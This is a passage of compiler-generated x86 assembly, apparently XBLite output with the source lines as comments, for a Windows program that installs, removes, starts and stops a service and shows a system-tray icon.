	mov	eax,16			;;; i659
	or	eax,256			;;; i763
; .xstk66.0002 = ebp-76	; internal variable
	mov	d[ebp-76],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i642
; .xstk66.0003 = ebp-84	; internal variable
	mov	d[ebp-84],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-84]			;;; i674a
	push	1			;;; i656a
	push	2			;;; i656a
	push	[ebp-76]			;;; i674a
	push	[%#SERVICE_ALL_ACCESS.server]			;;; i672a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp-44]			;;; i674a
	call	_CreateServiceA@52			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [556] IF schService THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0025.server			;;; i221
;
; [557] '	RegisterServiceProcess
;
; [558] SetServDescription (schService,$$ServDesc)
	mov	eax,addr @_string.0079.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-40]			;;; i674a
	call	func6F.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [559] CloseServiceHandle(schService)
;
; [0] EXTERNAL FUNCTION CloseServiceHandle (hSCObject)
	push	[ebp-40]			;;; i674a
	call	_CloseServiceHandle@4			;;; i619
;
; [561] 'PRINT "\nservice installed"
;
; [562] ELSE
	jmp	end.if.0025.server			;;; i107
else.0025.server:
;
; [563] ret = GetLastError()
	call	_GetLastError@0			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [564] 'PRINT "CreateService failed:",GetLastErrorStr()
;
; [565] END IF
end.if.0025.server:
;
; [567] CloseServiceHandle(schSCManager)
	push	[ebp-44]			;;; i674a
	call	_CloseServiceHandle@4			;;; i619
;
; [568] ELSE
	jmp	end.if.0024.server			;;; i107
else.0024.server:
;
; [569] ret = GetLastError()
	call	_GetLastError@0			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [570] 'PRINT "OpenSCManager failed:",GetLastErrorStr()
;
; [571] END IF
end.if.0024.server:
;
; [573] RETURN ret
	mov	eax,d[ebp-52]			;;; i665
	jmp	end.func66.server			;;; i258
;
; [574] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CmdInstallService.server:  ;;; Function end label for Assembly Programmers.
end.func66.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func66.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func66.server:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  CmdInstallService ()  *****
;  *****
;
; [576] FUNCTION SetServDescription (hService,STRING text)
.code
;
#ifdef SetServDescription.hService
#undef SetServDescription.hService
#endif
#define SetServDescription.hService ebp+8	; exposes function argument 'hService'
;
;
#ifdef SetServDescription.text
#undef SetServDescription.text
#endif
#define SetServDescription.text ebp+12	; exposes function argument 'text'
;
align 16
_SetServDescription.server@8:
;  *****
;  *****  FUNCTION  SetServDescription ()  *****
;  *****
func6F.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.76:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.76			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	push	0			;;; .
	push	0			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-48],eax			;;; i670
funcBody6F.server:
;
; [577] FUNCADDR CSD(XLONG,XLONG,XLONG)
#ifdef SetServDescription.CSD
#undef SetServDescription.CSD
#endif
#define SetServDescription.CSD ebp-40	; exposes local variable 'CSD'
;
;
; [578] STATIC hadvapi32Lib
data section 'globals$statics'
align	4
%6F%hadvapi32Lib.server:	db 4 dup ?
.code
;
; [579] SERVICE_DESCRIPTION sd
; .composites = ebp-44	; internal variable
#ifdef SetServDescription.sd
#undef SetServDescription.sd
#endif
#define SetServDescription.sd ebp-48	; exposes local variable 'sd'
;
;
; [583] 'IFZ hadvapi32Lib THEN
;
; [584] hadvapi32Lib = LoadLibraryA (&"advapi32.dll")
	mov	eax,addr @_string.0163.server			;;; i642
	push	eax			;;; i667a
	call	_LoadLibraryA@4			;;; i619
	mov	d[%6F%hadvapi32Lib.server],eax			;;; i668
;
; [585] IFZ hadvapi32Lib THEN
	mov	eax,d[%6F%hadvapi32Lib.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0026.server			;;; i195
;
; [586] 'PRINT "unable to load advapi32.dll:",GetLastErrorStr()
;
; [587] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func6F.server			;;; i258
;
; [588] END IF
else.0026.server:
end.if.0026.server:
;
; [590] CSD = GetProcAddress (hadvapi32Lib, &"ChangeServiceConfig2A")
	mov	eax,addr @_string.0164.server			;;; i642
	push	eax			;;; i667a
	push	[%6F%hadvapi32Lib.server]			;;; i672a
	call	_GetProcAddress@8			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [591] IFZ CSD THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0027.server			;;; i195
;
; [592] 'PRINT "function not found ChangeServiceConfig2A:",GetLastErrorStr()
;
; [593] FreeLibrary (hadvapi32Lib)
	push	[%6F%hadvapi32Lib.server]			;;; i672a
	call	_FreeLibrary@4			;;; i619
;
; [594] hadvapi32Lib = 0
	mov	eax,0			;;; i659
	mov	d[%6F%hadvapi32Lib.server],eax			;;; i668
;
; [595] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func6F.server			;;; i258
;
; [596] END IF
else.0027.server:
end.if.0027.server:
;
; [598] sd.lpDescription = &text
	mov	eax,d[ebp+12]			;;; i642
	mov	ebx,d[ebp-48]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [599] @CSD (hService,$$SERVICE_CONFIG_DESCRIPTION,&sd)
	mov	eax,d[ebp-40]			;;; i665
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.73			;;; i604
; .xstk6F.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	1			;;; i656a
	push	[ebp+8]			;;; i674a
	mov	eax,d[ebp-56]			;;; i665
	call	eax			;;; i620
A.73:
;
; [600] 'END IF
;
; [602] IF hadvapi32Lib THEN
	mov	eax,d[%6F%hadvapi32Lib.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0028.server			;;; i221
;
; [603] FreeLibrary (hadvapi32Lib)
	push	[%6F%hadvapi32Lib.server]			;;; i672a
	call	_FreeLibrary@4			;;; i619
;
; [604] hadvapi32Lib = 0
	mov	eax,0			;;; i659
	mov	d[%6F%hadvapi32Lib.server],eax			;;; i668
;
; [605] END IF
else.0028.server:
end.if.0028.server:
;
; [607] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func6F.server			;;; i258
;
; [608] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SetServDescription.server:  ;;; Function end label for Assembly Programmers.
end.func6F.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SetServDescription ()  *****
;  *****
;
; [610] FUNCTION CmdRemoveService()
.code
align 16
_CmdRemoveService.server@0:
;  *****
;  *****  FUNCTION  CmdRemoveService ()  *****
;  *****
func67.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody67.server:
;
; [611] SHARED SERVICE_STATUS ssStatus
;
; [612] SC_HANDLE   schService
#ifdef CmdRemoveService.schService
#undef CmdRemoveService.schService
#endif
#define CmdRemoveService.schService ebp-40	; exposes local variable 'schService'
;
;
; [613] SC_HANDLE   schSCManager
#ifdef CmdRemoveService.schSCManager
#undef CmdRemoveService.schSCManager
#endif
#define CmdRemoveService.schSCManager ebp-44	; exposes local variable 'schSCManager'
;
;
; [616] schSCManager = OpenSCManagerA (0, 0,$$SC_MANAGER_ALL_ACCESS )
	push	983103			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	call	_OpenSCManagerA@12			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [617] IF (schSCManager) THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0029.server			;;; i221
;
; [619] schService = OpenServiceA (schSCManager, &$$ServName, #SERVICE_ALL_ACCESS)
;
; [0] EXTERNAL FUNCTION OpenServiceA (hSCManager, lpServiceName, dwDesiredAccess)
	mov	eax,addr @_string.0075.server			;;; i642
; .xstk67.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	[%#SERVICE_ALL_ACCESS.server]			;;; i672a
	push	[ebp-52]			;;; i674a
	push	[ebp-44]			;;; i674a
	call	_OpenServiceA@12			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [620] IF (schService) THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.002A.server			;;; i221
;
; [621] '   try to stop the service
;
; [622] IF ( ControlService( schService, $$SERVICE_CONTROL_STOP, &ssStatus ) ) THEN
;
; [0] EXTERNAL FUNCTION ControlService (hService, dwControl, lpServiceStatus)
	mov	eax,d[%ssStatus.server]			;;; i642
	push	eax			;;; i667a
	push	1			;;; i656a
	push	[ebp-40]			;;; i674a
	call	_ControlService@12			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.002B.server			;;; i221
;
; [624] 'PRINT "Stopping service."
;
; [625] Sleep( 1000 )
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [626] DO
align 8
do.002C.server:
;
; [627] IF ( ssStatus.dwCurrentState == $$SERVICE_STOP_PENDING ) THEN
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
	mov	ebx,3			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.78			;;; i367
	call	%_eeeOverflow			;;; i368
A.78:
	cmp	eax,ebx			;;; i684a
	jne	>> else.002D.server			;;; i219
;
; [628] 'PRINT(".")
;
; [629] Sleep( 1000 )
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [630] ELSE
	jmp	end.if.002D.server			;;; i107
else.002D.server:
;
; [631] EXIT DO
	jmp	end.do.002C.server			;;; i144
;
; [632] END IF
end.if.002D.server:
;
; [634] LOOP WHILE( QueryServiceStatus( schService, &ssStatus ) )
do.loop.002C.server:
;
; [0] EXTERNAL FUNCTION QueryServiceStatus (hService, lpServiceStatus)
	mov	eax,d[%ssStatus.server]			;;; i642
	push	eax			;;; i667a
	push	[ebp-40]			;;; i674a
	call	_QueryServiceStatus@8			;;; i619
	test	eax,eax			;;; i194
	jnz	< do.002C.server			;;; i195
end.do.002C.server:
;
; [636] IF ( ssStatus.dwCurrentState == $$SERVICE_STOPPED )
	mov	eax,d[%ssStatus.server]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
	mov	ebx,1			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.79			;;; i367
	call	%_eeeOverflow			;;; i368
A.79:
	cmp	eax,ebx			;;; i684a
	jne	>> else.002E.server			;;; i219
;
; [637] 'PRINT("\nservice stopped.")
;
; [638] ELSE
	jmp	end.if.002E.server			;;; i107
else.002E.server:
;
; [639] 'PRINT "\nFailed to stop service:",GetLastErrorStr()
;
; [640] END IF
end.if.002E.server:
;
; [642] END IF
else.002B.server:
end.if.002B.server:
;
; [644] '   now remove the service
;
; [645] IF( DeleteService(schService) ) THEN
;
; [0] EXTERNAL FUNCTION DeleteService (hService)
	push	[ebp-40]			;;; i674a
	call	_DeleteService@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.002F.server			;;; i221
;
; [646] 'PRINT("service removed.")
;
; [647] ELSE
	jmp	end.if.002F.server			;;; i107
else.002F.server:
;
; [648] 'PRINT "DeleteService failed:",GetLastErrorStr()
;
; [649] CloseServiceHandle(schService)
	push	[ebp-40]			;;; i674a
	call	_CloseServiceHandle@4			;;; i619
;
; [650] END IF
end.if.002F.server:
;
; [652] ELSE
	jmp	end.if.002A.server			;;; i107
else.002A.server:
;
; [653] 'PRINT"OpenService failed",GetLastErrorStr()
;
; [654] END IF
end.if.002A.server:
;
; [656] CloseServiceHandle(schSCManager)
	push	[ebp-44]			;;; i674a
	call	_CloseServiceHandle@4			;;; i619
;
; [657] ELSE
	jmp	end.if.0029.server			;;; i107
else.0029.server:
;
; [658] 'PRINT"OpenSCManager failed:",GetLastErrorStr()
;
; [659] END IF
end.if.0029.server:
;
; [661] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CmdRemoveService.server:  ;;; Function end label for Assembly Programmers.
end.func67.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  CmdRemoveService ()  *****
;  *****
;
; [664] '    FUNCTION: ServiceStart
;
; [665] '    PURPOSE: Actual code of the service that does the work.
;
; [666] FUNCTION ServiceStart (dwArgc, lpszArgv)
.code
;
#ifdef ServiceStart.dwArgc
#undef ServiceStart.dwArgc
#endif
#define ServiceStart.dwArgc ebp+8	; exposes function argument 'dwArgc'
;
;
#ifdef ServiceStart.lpszArgv
#undef ServiceStart.lpszArgv
#endif
#define ServiceStart.lpszArgv ebp+12	; exposes function argument 'lpszArgv'
;
align 16
_ServiceStart.server@8:
;  *****
;  *****  FUNCTION  ServiceStart ()  *****
;  *****
func6B.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody6B.server:
;
; [667] SHARED hServerStopEvent
data section 'globals$shared'
align	4
%hServerStopEvent.server:	db 4 dup ?
.code
;
; [670] '   create the event object. The control handler function signals
;
; [671] '   this event when it receives the "stop" control code.
;
; [672] hServerStopEvent = CreateEventA ( 0,1,0,0)'   no name
;
; [0] EXTERNAL FUNCTION CreateEventA (lpEventAttributes, bManualReset, bInitialState, lpName)
	push	0			;;; i656a
	push	0			;;; i656a
	push	1			;;; i656a
	push	0			;;; i656a
	call	_CreateEventA@16			;;; i619
	mov	d[%hServerStopEvent.server],eax			;;; i668
;
; [674] '   report the status to the service control manager.
;
; [675] IF (!ReportStatusToSCMgr($$SERVICE_RUNNING,$$NO_ERROR,0)) THEN
	push	0			;;; i656a
	push	0			;;; i656a
	push	4			;;; i656a
	call	func6D.server			;;; i619
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
	test	eax,eax			;;; i220
	jz	>> else.0030.server			;;; i221
;
; [676] IF (hServerStopEvent) THEN
	mov	eax,d[%hServerStopEvent.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0031.server			;;; i221
;
; [677] CloseHandle(hServerStopEvent)
	push	[%hServerStopEvent.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
;
; [678] END IF
else.0031.server:
end.if.0031.server:
;
; [679] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func6B.server			;;; i258
;
; [680] END IF
else.0030.server:
end.if.0030.server:
;
; [683] ' StartMenuInit(0)
;
; [684] StartNetServer(0)
	push	0			;;; i656a
	call	func71.server			;;; i619
;
; [686] IF (hServerStopEvent) THEN
	mov	eax,d[%hServerStopEvent.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0032.server			;;; i221
;
; [687] WaitForSingleObject(hServerStopEvent,$$INFINITE)
;
; [0] EXTERNAL FUNCTION WaitForSingleObject (hHandle, dwMilliseconds)
	push	-1			;;; i656a
	push	[%hServerStopEvent.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
;
; [688] CloseHandle(hServerStopEvent)
	push	[%hServerStopEvent.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
;
; [689] END IF
else.0032.server:
end.if.0032.server:
;
; [691] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ServiceStart.server:  ;;; Function end label for Assembly Programmers.
end.func6B.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ServiceStart ()  *****
;  *****
;
; [693] FUNCTION ServiceStop()
.code
align 16
_ServiceStop.server@0:
;  *****
;  *****  FUNCTION  ServiceStop ()  *****
;  *****
func6C.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody6C.server:
;
; [694] SHARED hServerStopEvent
;
; [697] ShutDown ()
	call	funcD.server			;;; i619
;
; [698] CLOSE ($$ALL)
	sub	esp,64			;;; i487
	mov	d[esp],-1
	call	%_close
	add	esp,64			;;; i600
;
; [699] RemoveTrayIcon ()
	call	func70.server			;;; i619
;
; [700] XioFreeConsole ()
;
; [0] EXTERNAL FUNCTION  XioFreeConsole ()
	call	_XioFreeConsole@0			;;; i619
;
; [701] IF hServerStopEvent THEN SetEvent(hServerStopEvent)
	mov	eax,d[%hServerStopEvent.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0033.server			;;; i221
;
; [0] EXTERNAL FUNCTION SetEvent (hEvent)
	push	[%hServerStopEvent.server]			;;; i672a
	call	_SetEvent@4			;;; i619
else.0033.server:
end.if.0033.server:
;
; [702] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ServiceStop.server:  ;;; Function end label for Assembly Programmers.
end.func6C.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  ServiceStop ()  *****
;  *****
;
; [704] FUNCTION RemoveTrayIcon ()
.code
align 16
_RemoveTrayIcon.server@0:
;  *****
;  *****  FUNCTION  RemoveTrayIcon ()  *****
;  *****
func70.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.90:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.90			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody70.server:
;
; [705] NOTIFYICONDATA ndata
; .composites = ebp-40	; internal variable
#ifdef RemoveTrayIcon.ndata
#undef RemoveTrayIcon.ndata
#endif
#define RemoveTrayIcon.ndata ebp-44	; exposes local variable 'ndata'
;
;
; [706] SHARED hwnd
data section 'globals$shared'
align	4
%hwnd.server:	db 4 dup ?
.code
;
; [707] SHARED iconStatus
data section 'globals$shared'
align	4
%iconStatus.server:	db 4 dup ?
.code
;
; [710] IF hwnd THEN
	mov	eax,d[%hwnd.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0034.server			;;; i221
;
; [711] iconStatus = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%iconStatus.server],eax			;;; i668
;
; [712] ndata.hWnd = hwnd
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[%hwnd.server]			;;; i663a
	mov	d[eax+4],ebx			;;; i13b
;
; [713] ndata.uID = 2000
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2000			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [714] Shell_NotifyIconA ($$NIM_DELETE,&ndata)
;
; [0] EXTERNAL FUNCTION Shell_NotifyIconA (dwMessage, addrNOTIFYICONDATA)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	2			;;; i656a
	call	_Shell_NotifyIconA@8			;;; i619
;
; [715] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func70.server			;;; i258
;
; [716] ELSE
	jmp	end.if.0034.server			;;; i107
else.0034.server:
;
; [717] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func70.server			;;; i258
;
; [718] END IF
end.if.0034.server:
;
; [719] 'PostQuitMessage(0)
;
; [720] 'DestroyMenu (#hPopMenu)
;
; [722] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.RemoveTrayIcon.server:  ;;; Function end label for Assembly Programmers.
end.func70.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  RemoveTrayIcon ()  *****
;  *****
;
; [724] FUNCTION InstallTrayIcon (hwnd)
.code
;
#ifdef InstallTrayIcon.hwnd
#undef InstallTrayIcon.hwnd
#endif
#define InstallTrayIcon.hwnd ebp+8	; exposes function argument 'hwnd'
;
align 16
_InstallTrayIcon.server@4:
;  *****
;  *****  FUNCTION  InstallTrayIcon ()  *****
;  *****
func73.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.94:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.94			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody73.server:
;
; [725] NOTIFYICONDATA ndata
; .composites = ebp-40	; internal variable
#ifdef InstallTrayIcon.ndata
#undef InstallTrayIcon.ndata
#endif
#define InstallTrayIcon.ndata ebp-44	; exposes local variable 'ndata'
;
;
; [726] SHARED iconStatus
;
; [728] ndata.cbSize = SIZE(NOTIFYICONDATA)
	mov	eax,88			;;; i584
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [729] ndata.hWnd = hwnd
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp+8]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [730] ndata.uID = 2000
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2000			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [731] ndata.uFlags = $$NIF_ICON | $$NIF_MESSAGE | $$NIF_TIP
	mov	eax,2			;;; i659
	or	eax,1			;;; i763
	or	eax,4			;;; i763
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+12],eax			;;; i13b
;
; [732] ndata.uCallbackMessage = $$WM_TRAYICON
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,1025			;;; i659
	mov	d[eax+16],ebx			;;; i13b
;
; [733] ndata.hIcon = LoadIconA (GetModuleHandleA(0),&"IDI_STANDBY")
;
; [0] EXTERNAL FUNCTION LoadIconA (hInstance, lpIconName)
;
; [0] EXTERNAL FUNCTION GetModuleHandleA (lpModuleName)
	push	0			;;; i656a
	call	_GetModuleHandleA@4			;;; i619
; .xstk73.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	mov	eax,addr @_string.0184.server			;;; i642
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	_LoadIconA@8			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+20],eax			;;; i13b
;
; [734] ndata.szTip = "Right click then 'Stop' to Exit"
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,addr @_string.0186.server			;;; i663
	lea	edi,[eax+24]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,64			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
;
; [735] Shell_NotifyIconA($$NIM_ADD,&ndata)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	call	_Shell_NotifyIconA@8			;;; i619
;
; [736] DestroyIcon (ndata.hIcon)
;
; [0] EXTERNAL FUNCTION DestroyIcon (hIcon)
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	push	eax			;;; i667a
	call	_DestroyIcon@4			;;; i619
;
; [737] iconStatus = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%iconStatus.server],eax			;;; i668
;
; [739] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.InstallTrayIcon.server:  ;;; Function end label for Assembly Programmers.
end.func73.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  InstallTrayIcon ()  *****
;  *****
;
; [741] FUNCTION DialogProc (hwndDlg,uMsg,wParam,lParam)
.code
;
#ifdef DialogProc.hwndDlg
#undef DialogProc.hwndDlg
#endif
#define DialogProc.hwndDlg ebp+8	; exposes function argument 'hwndDlg'
;
;
#ifdef DialogProc.uMsg
#undef DialogProc.uMsg
#endif
#define DialogProc.uMsg ebp+12	; exposes function argument 'uMsg'
;
;
#ifdef DialogProc.wParam
#undef DialogProc.wParam
#endif
#define DialogProc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef DialogProc.lParam
#undef DialogProc.lParam
#endif
#define DialogProc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_DialogProc.server@16:
;  *****
;  *****  FUNCTION  DialogProc ()  *****
;  *****
func6A.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
